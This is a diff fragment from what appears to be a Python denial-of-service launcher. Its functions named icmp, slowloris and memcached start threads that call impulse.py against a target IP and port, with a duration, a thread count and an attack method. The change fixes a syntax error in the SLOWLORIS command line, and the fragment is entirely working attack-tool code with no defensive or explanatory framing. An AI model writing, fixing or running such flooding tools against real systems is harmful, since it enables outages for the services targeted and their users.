@@ -102,7 +102,7 @@ def icmp():
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def slowloris():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)a+" --method SLOWLORIS")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method SLOWLORIS")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def memcached():
   print(Fore.GREEN+"  Started Thread!")
